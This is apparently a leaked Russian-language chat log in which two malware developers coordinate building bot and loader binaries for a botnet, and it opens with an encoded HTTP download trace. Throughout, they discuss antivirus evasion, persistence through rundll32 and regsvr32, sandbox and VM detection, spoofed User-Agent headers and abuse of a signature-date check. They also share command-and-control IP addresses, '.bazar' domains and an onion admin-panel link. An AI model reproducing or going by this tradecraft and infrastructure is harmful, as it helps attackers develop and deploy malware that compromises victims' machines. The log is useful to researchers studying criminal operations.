Vvy52Lcl8o58UHcMicmnhCku7Nek8oMXlkuVDf6Za5eP4ilcvOpg8FkJZtCtsdcW3aKcetolgrc2cuHfE%2BqLuzJlceP883auocu236o2ZSgYprVMXHFy5JlivyqoUCNTbSKtRzWzif4YHguDX0LyZaGRs93RRHmq2gSPznitn6Jg8FZqwGNzBt%2BsiP2lMUGF%2FiqQGxXMX4gIQLBvxY7xeoM6AFaOvuPui%2FSotfkbp8Yf8yPPQKK5B6xhDzgWb5ljjUEjiwOy3ZsWAij0eEMkcJSbCsM6IWqdvI81i6HdiEv4O4JoPdImOLaX6Vc06o6PGwu6ceC9KoTHrXnxoB4OrOPt1SvVV0Ip4l5t9yR5CbvPawuXivAl504MFte0SMRNdW9UbhS6zBZwnsMDHc4uuOGCR3s3F2NoA%3D;
> Vary: 7CGUiZWB79jbgbQpLX1UoMTd8er6JnSF17PkznaM7%2FvGUCGoNZFg8gDAG1zdQAnm4hXvnLN3URZLG%2FYbfNbwJ%2Fx8awtc%2BZymNX9ZGdODhTOzovqnbKbo2bcz4W050D4cUSy%2FgpONE8wESwB7B8z29QWIXiOdBo5Cs8y3kiD9kGmIbkObQnywDnhqDBoWIahGj%2FY0bd9uyY5c08gDBs8UCvaWeDOxmNtzd2Qx0O4nhsvnFgI0%2FSfbjbGLRFaPqoiRQG7tJFKTbXC0o8KpkClTr6sS6s0FHFggJYYuLNFBI%2BIhFSChnZYvYL%2B4p1eoojKEvWJoHUxN70IRVeIQ%2FBc%2B5c%2FMbg16PRM9MBBGOZ9fIyhTMU%2Bw2esnkLFgh6n3lUw6G2Lmv%2FmG%2Bh8ananMN1tp3i%2BjkynVtEPTkRUcB61HhAxFp%2B4kY3QMDr3xLuMCFYijeWLlRS9l%2FgqbUWRVKVX93vofyb8%2B9mlf0YjSD0Oqy1Y%3D
> Var: Pk54OpLfwrYLog2Xj6j%2BjjyUrjRWlbfzoVLDYYi3gZxYlRY9QHEoxyZqrdbVqWJ5c1f%2BA0v971khmOdq8htTN%2BSAMKt5g%2Bs2UjoErADKMCNdm8Pu3h8yV%2F2keSJAYCrwlPBedgoZnSMCpz%2B6C6Ngt4YOkp7oh4ELnDQORCzpJ%2F8w0RM8zI1GGv3LpBwHMQtGo9JwMeEDqiC2YRF%2Fyvc9zssDN5tOx%2FJnEMEbnUO3pfgsoXZz7dN6dsQUD5QllbZCnJqpk4Lqw2oevyHLUdiFCex0RPhbXdl6SA5boulcubXbPc%2BWdRfD2DorFPntTFg0CRYo2SEiPkNiRngAQPSFFqckaYQOM6yRJpxAwXyIn5qOeQNE6WBywi748w%2FBdFBg3kC7%2BcbCb3OnYkVzVpQdMQ9aWyFeMVyiBVlPOYHJNga8srW9uFSak0gFvq1MvCBK%2B7buX57kgZxtiFCQK5wztXpGFNS3oQoATm2lL12PfNY%3D
> X-Tag: ZXs6LtcJS1ssfkwPoM4tt%2BWRiY3Hxs4l2%2FaaffYGyG2AIDayufHIlIWTLwQk0Bz2fA79NqVWIMNSyz2pS9JTXYJx6auwjYM1REsqTbpWB4BArnp2XBVlRibWCCq%2FbH5%2BYttd1KyP%2Fb1E5JHd0Qv3zhEPRRlyDjXceKt9B0Qh1e8SnVmps2M0jZzD9rOoXAjsdhk5I%2Fi%2BL3cU9Lh2gxVJyE3b2yRmresc4wSdKNCFJkLBuNvYLtLzeq91GMjAAnNwlJpBnZ7c7GH11vjNzWsF4204S5NOLKYZ98%2FgidBwCbUKG1SqyazPBnZAJ0MVuPMDoi0rfEuT5wtc0ZPjS3FTRZd%2B3dmDTz4IVM3KsTs06fR29wms2%2BxJmfdXpqfHdh2aGwzZubw%2BDH0OWEPsMHQbzuoYMSwFovFAIng5Qx6Pl6YD4%2FcjCmZFYfcpZnLgqpI%2BT%2F5s%2BhoPTSSVvLcmY1woPoyMXNOirAviKvbaKzxQNZA%3D
> Accept: */*

* Mark bundle as not supporting multiuse

< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: application/octet-stream
< Content-Length: 320000
< Connection: keep-alive
< Date: Thu, 05 Aug 2021 13:02:11 GMT
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=k1StB1Uufr
< Content-Transfer-Encoding: binary
< Expires: 0
< Cache-Control: must-revalidate, post-check=0, pre-check=0
< Pragma: public
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
[05.08.21 13:04:40] collin:		`Date: Thursday, 05 August 2021`
[05.08.21 13:04:46] collin:		и так работает без времени?
[05.08.21 13:05:21] royal:		Так это то что я шлю на сервер, а не он мне.
[05.08.21 13:05:32] collin:		это понятно
[05.08.21 13:05:37] royal:		Он проверяет подпись этой строки
[05.08.21 13:05:45] royal:		Там что угодно может быть.
[05.08.21 13:05:49] royal:		Выбрали дату
[05.08.21 13:05:56] collin:		там по прото2 в запросах лоадера время жизни ограничены, 15 минут живут
[05.08.21 13:06:01] collin:		а тут получается один запрос на весь день
[05.08.21 13:06:16] collin:		Там что угодно может быть. - вообще нет
[05.08.21 13:06:29] royal:		А как же прокатывает тогда
[05.08.21 13:06:48] collin:		это недокументированная возможность
[05.08.21 13:06:53] royal:		Я думаю туда можно написать Date: tralala
[05.08.21 13:06:56] royal:		И прокатит
[05.08.21 13:07:07] collin:		сейчас Силвер увидет и скажет альфонсу "правь"
[05.08.21 13:07:09] royal:		Если подпись нормальная будет
[05.08.21 13:07:41] royal:		Я думал чт сервер сам это время учитывает
[05.08.21 13:07:43] royal:		15 минут
[05.08.21 13:07:56] royal:		Можно же обмануть в противном слусае
[05.08.21 13:08:02] collin:		когда отправляешь время в формате со временем - учитывает, я проверял
[05.08.21 13:08:12] collin:		а тут дырка получается
[05.08.21 13:08:50] royal:		А если я буду время фиктивное писать там?
[05.08.21 13:09:04] royal:		Вся защита не сработает?
[05.08.21 13:09:17] collin:		так он сравнивает со временем сервера
[05.08.21 13:09:40] royal:		А смысл тогда время писать?
[05.08.21 13:09:51] royal:		Если сам сервер может всё учесть.
[05.08.21 13:10:10] royal:		Запомнил первый запрос отсчитал 15 минут и всё.
[05.08.21 13:10:30] collin:		другой запрос - другая подпись, подпись жива 15 минут, такая задумка была наверное
[05.08.21 13:11:01] collin:		если кто-то получил один запрос - он не сможет послать второй позднее этого лимита
[05.08.21 13:11:03] royal:		Тогда моя подпись вечно жива получается
[05.08.21 13:11:18] royal:		сутки
[05.08.21 13:11:20] collin:		в течении суток +15 минут наверное, но надо проверить
[05.08.21 13:11:38] royal:		И ещё проверить Date: tralala
[05.08.21 13:12:26] royal:		На формат даты нету ограничений получается, вот я и думаю что любую строку можно слать.
[05.08.21 15:14:40] collin:		https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=unimportant%2Fcommand&id=48bc12d7d1551f2546c6d7c0e9138c7f
[05.08.21 15:14:45] collin:		здесь тоже path не сел
[05.08.21 15:15:58] collin:		почему еще могут не садиться теперь?
[05.08.21 15:18:10] royal:		Может он больше чем MAX_PATH.
[05.08.21 15:18:42] collin:		такое может быть?
[05.08.21 15:19:18] collin:		а через стек-вызовов не пробывал выходить на свой длл-модуль?
[05.08.21 15:19:24] collin:		я как то писал про этот способ
[05.08.21 15:20:24] royal:		Может
[05.08.21 15:20:42] royal:		В юникод гораздобольше path может быть чем 256
[05.08.21 15:21:00] collin:		```
разбираем стек вызовов, выходим из точки входа нагрузки на экспорт-функцию крипта, затем определяем ее имя по адресу в памяти, в таблице экспорта, затем через PEB по адресу в коде определяем соответствующий модуль (метод предложил Элрой, в работе не проверял)
```
[05.08.21 15:22:15] collin:		а ты через GetModuleFileNameA получаешь имя?
[05.08.21 15:22:28] royal:		GetModuleFileNameW
[05.08.21 15:22:50] collin:		а где тогда ограничение MAX_PATH срабатывает
[05.08.21 15:24:16] royal:		GetModuleFileNameW успешно завершиться даже если будет больше MAX_PATH буфер
[05.08.21 15:24:25] royal:		Он просто обрежет
[05.08.21 15:24:35] royal:		Значит не в этом проблема.
[05.08.21 15:25:29] royal:		По командной строке увидим.
[05.08.21 15:31:22] royal:		Я тут сморю можно модуль определить по адресу функции. Например по main или DllMain
[05.08.21 15:33:45] royal:		Или вообще по любому адресу в модуле.
[05.08.21 15:35:38] collin:		да, а на адрес модуля крипта из кода лоадера - можнов ыйти через стек вызовов
[05.08.21 15:35:57] collin:		но я сам не пробывал это
[05.08.21 15:36:22] royal:		Без стека можно пишут, адрес указать любой из модуля.
[05.08.21 15:36:38] royal:		Надо попробовать.
[05.08.21 15:38:07] royal:		Только это не решит что path нету, когда берётся имя файла через GetModuleHandleW
[05.08.21 15:38:26] royal:		Всё равно командную строку надо смотреть.
[05.08.21 15:38:49] collin:		`адрес указать любой из модуля` - ты же не знаешь какие адреса в крипте будут
[05.08.21 15:47:20] collin:		в каких случаях бот может не ответить на команду 10 4
[05.08.21 15:48:09] collin:		так отбой, они на старых ботах ее погнали)
[05.08.21 15:52:05] royal:		В случаях проблем со связью
[06.08.21 07:48:44] collin:		привет!
[06.08.21 07:49:24] collin:		1) нужно доработать команду 10 4: вместо удаления старого лоадера надо его откреплять из системы (если закреплен) - иначе после перезагрукзи вот такая картинка:
[06.08.21 07:49:36] collin:		https://i.ibb.co/VpBwRB8/file1.png
[06.08.21 07:49:47] collin:		палевность
[06.08.21 07:50:35] collin:		не удалять - т.к. может быть в папке где у юзера нет прав - примеры вот сейчас в c:\users\public кидают, попытка неудачного удаления - тоже привлекает внимание
[06.08.21 07:50:49] collin:		таск накидаю в редмайне
[06.08.21 07:52:08] collin:		2) в 10 4 требуется доработка - бот должен знать как новый лоадер запускать - это будем делать
[06.08.21 07:52:33] collin:		а еще в команде 18 как быть - бот должен же знать какой командой закреплять лоадер
[06.08.21 07:52:41] royal:		Попытка удаления никак не привлекает внимания DeleteFile просто завершается с ошибкой.
[06.08.21 07:52:42] collin:		видимо надо эту инфу из лоадера в бот передавать
[06.08.21 07:53:24] collin:		`Попытка удаления никак не привлекает внимания DeleteFile просто завершается с ошибкой.` - не привлекает внимание юзера, а АВ?
[06.08.21 07:53:52] royal:		Я думаю нет, ошибка и всё.
[06.08.21 07:54:23] royal:		Зато если он останется он спалиться сос временем.
[06.08.21 07:54:40] royal:		Читсто статически.
[06.08.21 07:55:12] royal:		У меня много раз так было когда старые файлы со временем детект дают просто фактом своего присутствия.
[06.08.21 07:55:33] collin:		ок, тогда попытку удаления оставляем пока
[06.08.21 07:56:52] royal:		Закреплять командой 18 сейчас так если exe просто запуск процесса, если dll через rundll32 StartW
[06.08.21 07:57:08] collin:		у нас режим rundll32 - сейчас с переименованием функции при криптовании, т.е. бот не знает какое имя будет в крипте, его запустившем
[06.08.21 07:57:22] collin:		для длл нужно передавать имя экспорт-функции из лоадера в бот
[06.08.21 07:57:47] royal:		Всегда есть STartW
[06.08.21 07:58:31] collin:		в rundll32 нет
[06.08.21 07:58:33] royal:		Передавать командную строку запуска как в команде 10 4 надо сделать.
[06.08.21 07:58:34] collin:		ее переименовывают
[06.08.21 07:59:10] royal:		Если придумают ещё какой запуск переделывать придётся.
[06.08.21 07:59:22] collin:		тоже не вариант - оператор один а прогружает другой, оператор может не знать какую функцию для точки входа выбрали в очередной раз
[06.08.21 07:59:28] royal:		А так когда командную строку передаёшь всё универсально будет.
[06.08.21 07:59:47] collin:		аа
[06.08.21 08:00:52] collin:		лоадер передает в бот командную строку, тот ее парсит и определяет способ запуска для закрепа?
[06.08.21 08:01:44] royal:		передаёт например rundll32.exe %loader%,StartW
[06.08.21 08:02:03] royal:		Бот %loader% заменяет на настоящее имя.
[06.08.21 08:02:07] royal:		Запускает так.
[06.08.21 08:02:22] collin:		в команде 18 с админки передавать не пойдет, это проще с лоадера сделать
[06.08.21 08:03:56] royal:		Сам лоадер передаёт свою командную строку в бот
[06.08.21 08:05:35] royal:		У меня он сейчас передаёт её через переменную PARENTCMDLINE
[06.08.21 08:06:31] royal:		Я кстати нашёл вчера _ReturnAddress
[06.08.21 08:06:48] royal:		Возвращает адрес инструкции следующей за return
[06.08.21 08:07:00] royal:		Получается адрес в модуле крипта.
[06.08.21 08:07:18] royal:		И так можно определить модуль крипта.
[06.08.21 08:07:23] royal:		Я так думаю.
[06.08.21 08:07:28] royal:		Сегодня попробую.
[06.08.21 08:07:44] collin:		о круто!
[06.08.21 08:07:48] collin:		это интринсик или как?
[06.08.21 08:07:57] royal:		Да.
[06.08.21 08:08:23] royal:		В GCC тоже есть аналог __builtin_return_address
[06.08.21 08:08:44] royal:		И в Clang
[06.08.21 08:15:42] royal:		_ReturnAddress работает, если в экспортной функции вызывать вернёт адрес в модуле кто вызвал ёё (без крипта это regsvr32 например). А если в DllMain вызвращает на функцию Dll_Dispatch оказывается такая ещё есть перед DllMain.
[06.08.21 11:50:50] collin:		насчет команды 10 4 - добавил задачу 470 в редмайне
[06.08.21 11:50:51] collin:		возьми в работу
[06.08.21 11:52:20] collin:		и насчет формата команды "10 40 filename" - это корректно оказывается, нашел в дополнениях ТЗ на прото2:
[06.08.21 11:52:36] collin:		`Формат команд 10, 11 не меняется. Параметр %uri% в команде игнорируется
`
[06.08.21 12:30:41] collin:		сделай сборки для новой основной админки группы 19 и 20
[06.08.21 12:30:54] collin:		x64, режим regsvr32
[06.08.21 12:31:00] collin:		с автозакреплением сегодня
[06.08.21 12:31:05] collin:		адреса и базары:
[06.08.21 12:31:14] collin:		```
адреса первого этапа
бот:
134.122.48.133
64.227.75.136
64.227.75.195
64.227.79.47

лоадер:
64.227.75.195
64.227.79.47
134.122.48.133
64.227.75.136

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[06.08.21 12:31:21] collin:		на тест кидай wild
[06.08.21 12:31:27] collin:		группу 19 мне продублируй
[06.08.21 12:32:36] collin:		формат как вчера - получение имени файла в DllMain*
[06.08.21 13:15:30] collin:		как успехи?
[06.08.21 13:16:29] collin:		торопят(
[06.08.21 13:19:17] royal:		Будет как вчера.
[06.08.21 13:19:31] collin:		по времени как скоро?
[06.08.21 13:20:08] royal:		Как всегда минут 40.
[06.08.21 14:05:01] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9GFNJBkpwJ+qxkM4GuJLB3Z2YMn2hPJ1e5y2fXn9cYby6
ZGArzBp8dnRro2CZ7oV5TGpB3xk7tbPnkgnA8LwwtoyyigKBO8AXWG5uTw3vTiX5
nHrrBiTOe129meiQ+AnhJW41PP6nOmIRuw5aEKEFSmDJqxlJbXpDOXlm1gkJpupK
SJCyRk3hoCTFdvZELnFnCQMiLB+JeAHd3l0jTvxr9QN34mGHBT4SsGiTLt0iiJPh
lT0VaX1VCddmA0TRC/yt6VA0egotO7roZ1V+w+ANInK9AH6fOXaBi+icSLJV9fVB
4AAVohtHC3qap4wOvJNyRMsjCwKDjJGANXvBCijqL7+XgZkZfIEg2iyfHxiwOAdy
x8i8iP7Ln2kIOy6EKUgLIsUdYnbeV/7yVPAy3Flq5LmocAwpwfwyDPJukWhPBVeu
HVyzonOkmIEXqn2Zj2p8OEfCbNouf3uLlq/j42nNjUNPV8vKaxwTl1XQTlK/8dDK
IYFPiXQyXx80yKdsKzHPvbdNvo5P1g0F0zNFRrNmaqTZiAPzQPeuWrdQFYgMzBIN
e2hOzIn9jQC5BPH3f3p8UQh66ttWbNYdujyi8SP0FrE0qB3wlAM7iaNGqrJltXIG
gliHsGH1xXuxRHeiXmJlYu2CIhwebJ7S8buR8YtOkDGDzrzqTH/YwkZYhEQHTDTS
wD0BXztmsPQfqcwgtGAFsQA2tiXxULXnxwWEu8nvdlOw1gNSJJkqkzkUWcjGOy0i
VliPwC8AwDqg+vHMQH7BkIVXRdTUPdZ6obq9vsyqK6v+5v2C9XuN36MMwfqmujwU
RfVLA5SL5tyvpq9Ih9cG7VxwhNOkKYgk79JIV5ANV+EHFFL+63OkKtZa6W9SFJWv
dXkHRl8Mp6lhvAa7FgsCFm4PomPYfV8vi4zczi+7NAkjaFgg8Wvt+4kBitAFvl8a
yhDajyquIQL3Bu7hEsx+2F7o89ZXLdGKuOb36WQJSfAze0CRHsVz9JVG9eWXQjDG
hQbPlV1fHUu8Zbr1BkTZ
=cyj4
-----END PGP MESSAGE-----
[06.08.21 14:05:06] royal:		Использовать GCC.
[06.08.21 15:10:47] collin:		+
[09.08.21 08:21:10] collin:		привет!
[09.08.21 08:21:18] collin:		сделай сборки для новой основной админки
[09.08.21 08:21:56] collin:		группы 19 и 20, x64, режим regsvr32
[09.08.21 08:22:51] collin:		с автозакрепом, с попыткой определения имени файла из hinstDLL, переданного в DllMain
[09.08.21 08:22:58] collin:		адреса и базары:
[09.08.21 08:23:06] collin:		```
адреса (домены) первого этапа
бот:
161.35.152.48
161.35.144.108
161.35.144.15
161.35.95.83

лоадер:
161.35.144.15
161.35.95.83
161.35.152.48
161.35.144.108

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[09.08.21 08:23:32] collin:		направь wild
[09.08.21 10:10:50] collin:		1. я тебе добавил задачи в редмайне - ознакомься, включи в план работ с учетом указанных приоритетов
[09.08.21 10:11:15] collin:		2. у тебя в отчете GetSysInfo нет параметров VM и SB - не было на них ТЗ?
[09.08.21 10:21:59] royal:		Что такое SB?
[09.08.21 10:23:41] collin:		признак песочницы
[09.08.21 10:23:57] collin:		видимо, не было задачи - добавлю
[09.08.21 10:52:31] collin:		добавил задачу 492 "Признаки ВМ и песочницы в отчете Get SystemInfo" в редмайне
[09.08.21 12:04:45] royal:		А что пл поводу 10 4?
[09.08.21 12:05:15] royal:		Как запускать скачиваемый загрузчик?
[09.08.21 12:12:06] collin:		сейчас - сделай как в задаче 470
[09.08.21 12:13:03] collin:		на уровне админки будет доработка, сейчас какраз обсуждаю с альфонсом. Как будет готово - дам отдельную задачу на доработку
[09.08.21 13:34:40] collin:		т.е. до того как будет доработано в админке полагаем, что в команде 10 4 способ запуска нового файла такой же, как в старом
[10.08.21 07:17:41] collin:		привет!
[10.08.21 07:18:06] collin:		для сведения, вот такое ТЗ ушло веб-кодерам:
[10.08.21 07:18:13] collin:		```
16. Доработка команды "Force update now"
В билдере добавить элементы интерфейса для задания параметров:
- "Run mode" - раскрывающийся список со следующими значениями:
Default
EXE
DLL via rundll32
DLL via regsvr32
JS
- "Parameters" - однострочное текстовое поле.

Обеспечить контроль корректности выбора параметров команды:
- значение "Run type" должно быть задано, по умолчанию Default.
- для всех "Run mode" кроме Default обязательно выбирать/загружать файл в "Select/Upload execution file". Для Default выбор/загрузка файла недоступна.
- для "Run mode" rundll32 - "Parameters" должно быть не пустое.

Формат команды, отправляемой боту:
10 4 %mode% %cmdline%
где
mode: числовое значение, соответствующее выбранной позиции в списке "Run mode":
0 - Default
1 - EXE
2 - DLL via rundll32
3 - DLL via regsvr32
4 - JS
cmdline: значение из поля "Parameters".
```
[10.08.21 07:18:35] collin:		по боту позднее сформулирую ТЗ, таск добавлю
[10.08.21 07:21:07] royal:		OK.
[10.08.21 07:42:36] royal:		Default что значит? Запустить загрузчик?
[10.08.21 07:42:46] royal:		Автообновления то нету.
[10.08.21 07:43:42] collin:		да, заготовка на будущее
[10.08.21 07:57:27] collin:		какой у тебя useragent в БК
[10.08.21 07:57:32] collin:		при запросах к командным серверам?
[10.08.21 08:00:50] royal:		Никакой.
[10.08.21 08:02:10] collin:		хедер User-Agent, он же обязательный
[10.08.21 08:03:03] royal:		Выходит что нет.
[10.08.21 08:03:18] royal:		У меня нету его.
[10.08.21 08:03:33] royal:		Без него сервер не отдаст команду?
[10.08.21 08:04:43] collin:		без него палится походу
[10.08.21 08:04:48] collin:		надо добавить какой-то
[10.08.21 08:04:57] collin:		и обновлять минимум раз в неделю
[10.08.21 08:07:37] collin:		```
при обмене с серверами БК необходимо использовать заголовок User-Agent такой, какие используются в реальных сетевых приложениях (браузерах, мессенджерах и т.д.).
Например:
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko
Можно искать значения здесь: https://developers.whatismybrowser.com/useragents/explore/

Тип доработки: безусловная, для любых сборок.
Приоритет: высокий.
```
[10.08.21 08:07:41] collin:		в редмайн добавил
[10.08.21 08:51:56] collin:		сделай сборки группы 19 и 20
[10.08.21 08:52:13] collin:		с теми же параметрами как вчера были + добавь User-Agent в запросы
[10.08.21 08:52:21] collin:		адреса новые, вот эти:
[10.08.21 08:52:33] collin:		```
адреса (домены) первого этапа
бот:
161.35.152.204
161.35.95.166
128.199.54.51
161.35.144.74

лоадер:
128.199.54.51
161.35.144.74
161.35.152.204
161.35.95.166

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[10.08.21 08:52:40] collin:		направь wild
[10.08.21 09:01:19] collin:		```
 сделай сборки группы 19 и 20
с теми же параметрами как вчера были + добавь User-Agent в запросы
адреса новые, вот эти:

адреса (домены) первого этапа
бот:
161.35.152.204
161.35.95.166
128.199.54.51
161.35.144.74

лоадер:
128.199.54.51
161.35.144.74
161.35.152.204
161.35.95.166

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar

    направь wild


```
[10.08.21 09:01:25] collin:		подтверди что увидел задачу
[10.08.21 09:01:28] collin:		а то ты вылетал
[10.08.21 09:01:51] royal:		Увидел.
[10.08.21 09:27:52] collin:		как часто ты меняешь "Fake Cookies" в группах, в 19-20 когда последний раз менял?
[10.08.21 09:28:07] royal:		Каждый запрос генерируются.
[10.08.21 09:28:23] collin:		в карточке группы, которыми сервер отвечает
[10.08.21 09:28:23] royal:		Вчера убрал часть из них.
[10.08.21 09:28:42] royal:		В карточке группы не менял.
[10.08.21 09:29:16] royal:		Может их сделают чтобы админка генерировала имена?
[10.08.21 09:29:31] collin:		думаю пока как лучше
[10.08.21 09:29:32] royal:		Из словаря самых распространённых.
[10.08.21 09:29:50] collin:		плюс на разные прогрузы надо разные наверное - сейчас поменяю например и они на стархы ботах спалятся до начала работы)
[10.08.21 09:30:27] royal:		Мне кажеться они вообще не влияют.
[10.08.21 09:30:35] royal:		Только для кучи.
[10.08.21 09:31:28] collin:		поменяю их сам сегодня когда первый крипт тестер выдаст, так пока
[10.08.21 14:02:11] collin:		```
path:	c:\users\public\mp3Mp4.jpg
cmdline:	c:\users\public\mp3Mp4.jpg
```
[10.08.21 14:02:32] collin:		в ботах новых afa4f81ebebe46fbc10871acee3f2b36 77e832cd12bbac0dd3cde0101bc0b23e например
[10.08.21 14:02:36] collin:		очень странно..
[10.08.21 14:02:57] collin:		path:	c:\users\public\mp3Mp4.jpg
cmdline:	c:\users\public\mp3Mp4.jpg

в ботах новых afa4f81ebebe46fbc10871acee3f2b36 77e832cd12bbac0dd3cde0101bc0b23e например
очень странно..
[10.08.21 14:03:34] royal:		Косяк того кто запускает.
[10.08.21 14:03:49] royal:		Так запускают значит
[10.08.21 14:04:02] royal:		GetCommandLineW вернула это.
[10.08.21 14:04:07] collin:		иили подменяют строку после запуска
[10.08.21 14:04:23] royal:		Тогда тоже косяк того кто запускает.
[10.08.21 14:04:34] royal:		Или крипта.
[10.08.21 14:04:47] collin:		сейчас проверю крипт у себя
[10.08.21 14:05:51] royal:		Подменяют скорей всего. Штатно командная строка всегда в ковычках.
[10.08.21 14:06:04] royal:		А тут без ковычек.
[10.08.21 14:07:53] royal:		Штатно например так должно выглядеть
path:	C:\Users\ivana\Projects\dl2\proto_v2_tiny\bin\x64\Release\dl2_x64_20_347.exe
cmdline:	"C:\Users\ivana\Projects\dl2\proto_v2_tiny\bin\x64\Release\dl2_x64_20_347.exe"
[10.08.21 14:08:11] collin:		да во вчерашних группа 20 - нормальные
[10.08.21 14:08:21] collin:		19 вчера не грузили они, сегодня тольлко
[10.08.21 14:08:42] collin:		кстати, они грузят через rundll32, хотя просят через regsvr32
[10.08.21 14:09:03] collin:		при этом у них отстук меньше, мне предъявляют
[10.08.21 14:09:18] collin:		сделай всетаки разделение режимов regsvr32 и regsvr32+rundll32
[10.08.21 14:09:23] collin:		чтобы не путаться
[10.08.21 14:09:40] collin:		т.е. в regsvr32 - точка запуска только в одной функции DllRegisterServer
[10.08.21 14:10:04] royal:		Ещё в StartW
[10.08.21 14:10:13] royal:		Для запуска из закрепа.
[10.08.21 14:10:36] collin:		надо переделать
[10.08.21 14:10:39] collin:		таск добавлю
[10.08.21 14:11:04] collin:		StartW - вещь вообще палевная, давно и многие через нее работают
[10.08.21 14:11:22] collin:		хотя бы какое-то шумовое имя тогда бери
[10.08.21 14:11:46] royal:		Там 7 функций в экспорте.
[10.08.21 14:12:17] royal:		Для шума, если были только STartW и DllRegisterServer сразу куча детектов.
[10.08.21 14:12:42] royal:		В крипте я видел 70 функций в экспорте.
[10.08.21 14:12:52] collin:		некоторые стабы добавляют шумовой экспорт сами
[10.08.21 14:14:35] collin:		так тогда предлагаю: возьми рандом-строку для имени экспорт функции (для закрепа в режиме regsvr32) - меняй вручную раз в неделю, а лучше сделай чтобы она на основе версии сборки генерировалась
[10.08.21 14:15:20] royal:		Из закрепа будет regsvr32
[10.08.21 14:15:30] royal:		Как запустили так и закрепиться.
[10.08.21 14:16:18] collin:		или так тогда
[10.08.21 14:16:22] royal:		Смотрю на первый аргумент командной строки и выбираю rundll32 или regsvr32 или просто запуск процесса
[10.08.21 14:16:47] royal:		Только портит кто то командную строку.
[10.08.21 14:18:15] royal:		Посмотри крипт.
[10.08.21 14:18:28] royal:		Если не он. то портит их документ.
[10.08.21 14:21:21] royal:		Я помню первые наши крипты портили командную строку некторые.
[10.08.21 14:23:58] collin:		проверю
[10.08.21 14:27:38] royal:		До меня дошло, чтобы понять что за утилита запустила не нужно командную строку смотреть, просто GetModuleFileName(NULL) сделать.
[10.08.21 15:40:46] collin:		в крипте все норм, ждем ответа от партнера, что они там подменяют или нет
[10.08.21 15:41:01] collin:		если подменяет - тогда вообще на коммандую строку ориентироваться нельзя(
[10.08.21 15:41:50] royal:		Она нужна всё равно, имя функции не получишь для запуска rundll32
[10.08.21 15:42:03] royal:		Только вшивать.
[10.08.21 15:43:44] collin:		имя функции могут же поменять при криптовании, по сравнению с исходной нагрузкой
[10.08.21 15:43:54] collin:		нужно выходить на образ модуля крипта, искать у него в экспорте по адресу кода
[10.08.21 15:43:57] collin:		только так остается
[10.08.21 15:44:28] royal:		Там 70 функций в экспорте мусорных.
[10.08.21 15:45:09] collin:		в коде можно же определить адрес в памяти текущей функции
[10.08.21 15:45:15] collin:		я таск там сделал с примером кода
[10.08.21 15:45:44] collin:		Определение имени файла лоадера в DLL-модуле - эта вот, посмотри
[10.08.21 15:46:15] collin:		вопрос выхода на образ крипта вместо памяти с нагрузкой - решается использованием других профилей криптования, например bk или leo
[10.08.21 15:47:01] royal:		_ReturnAddress
[10.08.21 15:47:04] royal:		Помню.
[10.08.21 15:47:27] collin:		нет, еще другое
[10.08.21 15:48:05] collin:		```
void Loader_Main(...)
{
...
    DWORD_PTR ldrMainAddr = (DWORD_PTR)&Loader_Main;
    wchar_t * ldrModuleName = GetModuleNameByAddr(ldrMainAddr);
...

}
```
[10.08.21 15:48:53] collin:		ldrModuleName - будет адрес функции в памяти
[10.08.21 15:49:27] royal:		Это чтобы имя функции получить?
[10.08.21 15:49:29] collin:		ldrMainAddr*
[10.08.21 15:49:42] collin:		это чтобы на модуль выйти
[10.08.21 15:50:18] royal:		В крипте же это будет адрес в куче.
[10.08.21 15:50:35] collin:		находим модуль - т.е. адрес начала региона, по адресу функции находим относительный адрес RVA он вроде
[10.08.21 15:50:39] royal:		Модуля не существует загрузчика.
[10.08.21 15:51:02] collin:		в профиле Leo - делается подмена, в PEB указатель на адрес нагрузки с именем модуля крипта
[10.08.21 15:51:41] collin:		нет - адрес функции не найдем так, только сам модуль
[10.08.21 15:51:50] collin:		там же крипт другая таблица экспорта
[10.08.21 15:52:08] collin:		только через _returnaddress получается
[10.08.21 15:52:39] collin:		из экспорт функции нагрузки - в экспорт-функцию крипта, дальше ее имя определяем по таблице экспорта
[10.08.21 15:53:02] collin:		я там почитал особые опции компиляции нужны для этого метода, без оптимизации вроде
[10.08.21 15:53:34] collin:		поэтому нужен или шеллкод или линковать асм-функцию
[10.08.21 15:53:38] collin:		которая сама будет стек разгребать
[10.08.21 15:53:48] royal:		Для returnaddress я проверял с оптимизацией O2 и без crt
[10.08.21 15:53:55] royal:		Всё работает.
[10.08.21 15:54:00] collin:		а в LLVM?
[10.08.21 15:54:13] royal:		Не проверял там.
[10.08.21 15:54:56] royal:		По идеи должно работать, они аналогичны.
[10.08.21 15:55:16] collin:		для него тоже про опцию упоминается, стековые кадры должны быть включены
[10.08.21 15:55:27] collin:		а она по умолчанию в отладочном профиле сборки только
[11.08.21 07:37:40] collin:		привет!
[11.08.21 07:38:14] collin:		сделай сборки - группы 19 и 20, для новой основной админки
[11.08.21 07:38:23] collin:		с теми же параметрами как вчера
[11.08.21 07:38:26] collin:		адреса и базары:
[11.08.21 07:38:37] collin:		```
адреса (домены) первого этапа
бот:
68.183.3.35
142.93.135.196
104.248.91.231
134.209.196.117

лоадер:
104.248.91.231
134.209.196.117
68.183.3.35
142.93.135.196

домены второго этапа
бот:
